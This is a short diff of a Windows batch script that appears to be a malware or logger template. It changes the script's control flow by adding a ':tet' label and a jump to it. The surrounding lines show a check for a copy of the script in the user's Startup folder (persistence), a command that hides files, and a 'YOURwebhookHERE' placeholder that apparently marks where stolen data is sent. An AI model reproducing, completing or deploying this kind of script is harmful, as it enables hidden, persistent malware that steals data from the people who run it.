@@ -5,6 +5,7 @@ set fnamext=%~nx0
 
 goto test
 
+:tet
 cd %own%
 :check
 if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%fnamext%" goto log
@@ -60,3 +61,4 @@ attrib *.* +h
 
 :test
 set webhook=YOURwebhookHERE
+goto tet
